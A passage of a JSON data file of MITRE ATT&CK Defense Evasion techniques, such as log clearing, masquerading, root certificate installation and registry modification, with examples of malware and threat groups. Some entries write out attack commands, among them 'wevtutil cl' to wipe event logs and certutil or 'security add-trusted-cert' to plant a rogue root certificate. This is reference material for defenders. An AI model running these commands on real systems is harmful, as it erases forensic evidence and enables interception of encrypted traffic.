            "Name": "Hidden Window",
            "Description": "The configurations for how applications run on macOS and OS X are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window  [1].\n",
            "ID": "T1143",
            "Tactic": "Defense Evasion",
            "Platform: ": "macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring",
            "Version": "1.0"
        },
        "HISTCONTROL": {
            "Name": "HISTCONTROL",
            "Description": "The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.\n",
            "ID": "T1148",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Authentication logs, File monitoring, Environment variable",
            "Defense Bypassed: ": "Log analysis, Host forensic analysis",
            "Version": "1.0"
        },
        "Indicator Blocking": {
            "Name": "Indicator Blocking",
            "Description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include modifying sensor settings stored in configuration files and/or Registry keys to disable or maliciously redirect event telemetry. [1]In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n",
            "ID": "T1054",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Data Sources: ": "Sensor health and status, Process command-line parameters, Process monitoring",
            "Defense Bypassed: ": "Anti-virus, Log analysis, Host intrusion prevention systems",
            "CAPEC ID: ": "CAPEC-571",
            "Version": "1.0"
        },
        "Indicator Removal from Tools": {
            "Name": "Indicator Removal from Tools",
            "Description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use Software Packing or otherwise modify the file so it has a different signature, and then re-use the malware.\n",
            "ID": "T1066",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Process use of network, Process monitoring, Process command-line parameters, Anti-virus, Binary file metadata",
            "Defense Bypassed: ": "Log analysis, Host intrusion prevention systems, Anti-virus",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to remove indicators of compromise from tools.[1]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike includes a capability to modify the \"beacon\" payload to eliminate known signatures or unpacking methods.[2]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Analysis of Daserf has shown that it regularly undergoes technical improvements to evade anti-virus detection.[3]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda has updated and modified its malware, resulting in different hash values that evade detection.[4]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "The author of GravityRAT submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.[5]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.[6]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.[7]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures.[8][9]"
                },
                {
                    "Name": "Turla",
                    "Description": "Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.[10]"
                }
            ]
        },
        "Indicator Removal on Host": {
            "Name": "Indicator Removal on Host",
            "Description": "Adversaries may delete or alter generated artifacts on a host system, including logs and potentially captured files such as quarantined malware. Locations and format of logs will vary, but typical organic system logs are captured as Windows events or Linux/macOS files such as Bash History and /var/log/* .Actions that interfere with eventing and other notifications that can be used to detect intrusion activity may compromise the integrity of security solutions, causing events to go unreported. They may also make forensic analysis and incident response more difficult due to lack of sufficient data to determine what occurred.Clear Windows Event LogsWindows event logs are a record of a computer's alerts and notifications. Microsoft defines an event as \"any significant occurrence in the system or in a program that requires users to be notified or an entry added to a log.\" There are three system-defined sources of Events: System, Application, and Security.Adversaries performing actions related to account management, account logon and directory service access, etc. may choose to clear the events in order to hide their activities.The event logs can be cleared with the following utility commands:wevtutil cl systemwevtutil cl applicationwevtutil cl securityLogs may also be cleared through other mechanisms, such as PowerShell.\n",
            "ID": "T1070",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters, API monitoring, Windows event logs",
            "Defense Bypassed: ": "Log analysis, Host intrusion prevention systems, Anti-virus",
            "CAPEC ID: ": "CAPEC-93",
            "Contributors: ": "Ed Williams, Trustwave, SpiderLabs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security.[1][2]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 used SDelete to remove artifacts from victims.[3]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has cleared select event log entries.[4]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot delets all artifacts associated with the malware from the infected machine.[5]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "The BlackEnergy component KillDisk is capable of deleting Windows Event Logs.[6]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.[7][8]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 has cleared event logs from victims.[9]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has cleared logs during post compromise cleanup activities.[10]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher clears the system event logs.[11][12]"
                },
                {
                    "Name": "gh0st",
                    "Description": "gh0st RAT is able to wipe event logs.[13]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can clear all system event logs.[14][15]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat is capable of deleting Registry keys used for persistence.[16]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz can overwrite Registry settings to reduce its visibility on the victim.[17]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "After encrypting log files, the log encryption module in Prikormka deletes the original, unencrypted files from the host.[18]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton removes logs from /var/logs and /Library/logs.[19]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy has a module to clear event logs with PowerShell.[20]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM has the ability to remove Registry entries that it created during execution.[21]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT contains code to clear event logs.[22]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck clears event logs.[23]"
                }
            ]
        },
        "Indirect Command Execution": {
            "Name": "Indirect Command Execution",
            "Description": "Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command-Line Interface, Run window, or via scripts. [1] [2]Adversaries may abuse these utilities for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd.\n",
            "ID": "T1202",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Windows event logs",
            "Defense Bypassed: ": "Application whitelisting, Process whitelisting, Whitelisting by file name or path",
            "Contributors: ": "Matthew Demaske, Adaptforward",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Forfiles",
                    "Description": "Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.[1][2]"
                }
            ]
        },
        "Install Root Certificate": {
            "Name": "Install Root Certificate",
            "Description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. [1] Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. [2]Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. [3]Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. [4]In macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain. [5]\n",
            "ID": "T1130",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "Administrator, User",
            "Data Sources: ": "SSL/TLS inspection, Digital certificate logs",
            "Defense Bypassed: ": "Digital Certificate Validation",
            "Contributors: ": "Itzik Kotler, SafeBreach; Travis Smith, Tripwire; Red Canary; Matt Graeber, @mattifestation, SpecterOps",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "certutil",
                    "Description": "certutil can be used to install browser root certificates as a precursor to performing man-in-the-middle between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\\cert512121.der.[6]"
                },
                {
                    "Name": "Dok",
                    "Description": "Dok installs a root certificate to aid in man-in-the-middle actions.[7]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can add a certificate to the Windows store.[8]"
                }
            ]
        },
        "LC_MAIN Hijacking": {
            "Name": "LC_MAIN Hijacking",
            "Description": "As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  [1]. The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  [2]. By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.\n",
            "ID": "T1149",
            "Tactic": "Defense Evasion",
            "Platform: ": "macOS",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Binary file metadata, Malware reverse engineering, Process monitoring",
            "Defense Bypassed: ": "Application whitelisting, Process whitelisting, Whitelisting by file name or path",
            "Version": "1.0"
        },
        "Masquerading": {
            "Name": "Masquerading",
            "Description": "Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.One variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs. This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.WindowsIn another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. [1] An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. [2]An example of abuse of trusted locations in Windows would be the C:\\Windows\\System32 directory. Examples of trusted binary names that can be given to malicious binares include \"explorer.exe\" and \"svchost.exe\".LinuxAnother variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. [3]An example of abuse of trusted locations in Linux  would be the /bin directory. Examples of trusted binary names that can be given to malicious binares include \"rsyncd\" and \"dbus-inotifier\". [4] [5]\n",
            "ID": "T1036",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Binary file metadata",
            "Defense Bypassed: ": "Whitelisting by file name or path",
            "Contributors: ": "ENDGAME; Bartosz Jerzman",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following command to rename one of their tools to a benign file name: ren \"%temp%\\upload\" audiodg.exe[6]"
                },
                {
                    "Name": "APT1",
                    "Description": "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware.[7][8]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has used hidden or non-printing characters to help masquerade file names on a system, such as appending a Unicode no-break space character to a legitimate service name.[9]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS attempts to hide its payloads using legitimate filenames.[10]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.[11]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto's installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.[12]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak malware names itself \"svchost.exe,\" which is the name of the Windows shared service host program.[13]"
                },
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.[14]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).[15]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "The CozyCar dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.[2]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.[16]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.[17][18]"
                },
                {
                    "Name": "Elise",
                    "Description": "If installing itself as a service fails, Elise instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.[19]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus has masqueraded as legitimate Adobe Content Management System files.[20]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has created a scheduled task named \"AdobeFlashSync\" to establish persistence.[21]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.[22][23]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.[24]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe, as well as by adding a new service named OfficeUpdateService.[25]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole saves one of its files as mpr.dll in the Windows folder, masquerading as a legitimate library file.[26]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs establishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service.[27]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.[28][29]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.[28][29]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has used filenames and Registry key names associated with Windows Defender.[30]"
                },
                {
                    "Name": "Nidiran",
                    "Description": "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.[31][32]"
                },
                {
                    "Name": "OLDBAIT",
                    "Description": "OLDBAIT installs itself in %ALLUSERPROFILE%\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe; the directory name is missing a space and the file name is missing the letter \"o.\"[33]"
                },
                {
                    "Name": "OwaAuth",
                    "Description": "OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\; the malicious file by the same name is saved in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\.[34]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as \"Net Monitor.\"[35]"
                },
                {
                    "Name": "PlugX",
                    "Description": "In one instance, menuPass added PlugX as a service with a display name of \"Corel Writing Tools Utility.\"[36]"
                },
                {
                    "Name": "Poseidon Group",
                    "Description": "Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense.[37]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.[38]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT used the PowerShell filenames Office365DCOMCheck.ps1 and SystemDiskClean.ps1.[39]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT has dropped binaries as files named microsoft_network.exe and crome.exe.[40]"
                },
                {
                    "Name": "RawPOS",
                    "Description": "New services created by RawPOS are made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\".[41][42][43]"
                },
                {
                    "Name": "Remsec",
                    "Description": "The Remsec loader implements itself with the name Security Support Provider, a legitimate Windows function. Various Remsec .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. Remsec also disguised malicious modules using similar filenames as custom network encryption software on victims.[44][45]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service.[28][29]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon creates a new service named \"ntssrv\" that attempts to appear legitimate; the service's display name is \"Microsoft Network Realtime Inspection Service\" and its description is \"Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.\"[46]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\\microsoft\\security.[47]"
                },
                {
                    "Name": "SslMM",
                    "Description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[48]"
                },
                {
                    "Name": "Starloader",
                    "Description": "Starloader has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.[47]"
                },
                {
                    "Name": "Truvasys",
                    "Description": "To establish persistence, Truvasys adds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager.[49]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer mimics a legitimate Russian program called USB Disk Security.[50]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.[51][52]"
                },
                {
                    "Name": "Winnti",
                    "Description": "A Winnti implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.[53]"
                },
                {
                    "Name": "yty",
                    "Description": "yty contains several references to football (including \"football,\" \"score,\" \"ball,\" and \"loose\") in a likely attempt to disguise its traffic.[54]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.[28]"
                }
            ]
        },
        "Modify Registry": {
            "Name": "Modify Registry",
            "Description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. [1] Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. [1]hide NOV 2006 Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to establish Persistence. [2] [3]The Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. [4] Often Valid Accounts are required, along with access to the remote system's Windows Admin Shares for RPC communication.\n",
            "ID": "T1112",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "Windows Registry, File monitoring, Process monitoring, Process command-line parameters, Windows event logs",
            "Defense Bypassed: ": "Host forensic analysis",
            "Contributors: ": "Bartosz Jerzman; Travis Smith, Tripwire; David Lu, Tripwire",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL is capable of setting and deleting Registry values.[5]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 uses a Port 22 malware variant to modify several Registry keys.[6]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system.[7]"
                },
                {
                    "Name": "BADCALL",
                    "Description": "BADCALL modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\List.[8]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.[9]"
                },
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas creates three Registry keys to establish persistence by adding a New Service.[10]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK may store RC4 encrypted configuration information in the Windows Registry.[11]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 modified the Registry to perform multiple techniques through the use of Reg.[12]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.[13]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has deleted Registry keys during post compromise cleanup activities.[14]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.[15]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.[16]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys.[17][18]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.[19]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.[20]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito stores configuration values under the Registry key HKCU\\Software\\Microsoft[dllname] and modifies Registry keys under HKCR\\CLSID...\\InprocServer32with a path to the launcher.[21]"
                },
                {
                    "Name": "Naid",
                    "Description": "Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.[22]"
                },
                {
                    "Name": "Nerex",
                    "Description": "Nerex creates a Registry subkey that registers a new service.[23]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.[24]"
                },
                {
                    "Name": "PHOREAL",
                    "Description": "PHOREAL is capable of manipulating the Registry.[25]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE uses reg add to add a Registry Run key for persistence.[26]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy creates a Registry subkey that registers a new system device.[27]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.[28]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT has a command to edit the Registry on the victim’s machine.[29]"
                },
                {
                    "Name": "Reg",
                    "Description": "Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.[1]"
                },
                {
                    "Name": "Regin",
                    "Description": "Regin appears to have functionality to modify remote Registry information.[30]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover has functionality to remove Registry Run key persistence as a cleanup procedure.[31]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can delete all Registry entries created during its execution.[32]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.[33][34]"
                },
                {
                    "Name": "SOUNDBITE",
                    "Description": "SOUNDBITE is capable of modifying the Registry.[25]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx has the ability to modify the Registry.[35]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck can manipulate Registry keys.[36]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can create a new Registry key under HKEY_CURRENT_USER\\Software\\Classes\\.[37]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.[38]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentContorlSet\\Control\\WMI\\Security.[39][40]"
                }
            ]
        },
        "Network Share Connection Removal": {
            "Name": "Network Share Connection Removal",
            "Description": "Windows shared drive and Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the net use \\system\\share /delete command. [1]Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation.\n",
            "ID": "T1126",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, User",
            "Data Sources: ": "Process monitoring, Process command-line parameters, Packet capture, Authentication logs",
            "Defense Bypassed: ": "Host forensic analysis",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Net",
                    "Description": "The net use \\system\\share /delete command can be used in Net to remove an established connection to a network share.[1]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection.[2]"
                }
            ]
        },
        "NTFS File Attributes": {
            "Name": "NTFS File Attributes",
            "Description": "Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. [1] Within MFT entries are file attributes, [2] such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). [1] [3] [4] [5]Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. [6] [4]\n",
            "ID": "T1096",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Data Sources: ": "File monitoring, Kernel drivers, API monitoring, Process command-line parameters",
            "Defense Bypassed: ": "Signature-based detection, Host forensic analysis, Anti-virus",
            "Contributors: ": "Red Canary; Oddvar Moe, @oddvarmoe",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Gazer",
                    "Description": "Gazer stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.[7]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke hides many of its backdoor payloads in an alternate data stream (ADS).[8]"
                },
                {
                    "Name": "POWERSOURCE",
                    "Description": "If the victim is using PowerShell 3.0 or later, POWERSOURCE writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\\Windows\\.[9]"
                },
                {
                    "Name": "Regin",
                    "Description": "The Regin malware platform uses Extended Attributes to store encrypted executables.[10]"
                },
                {
                    "Name": "Zeroaccess",
                    "Description": "Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes.[11]"
                }
            ]
        },
        "Obfuscated Files or Information": {
            "Name": "Obfuscated Files or Information",
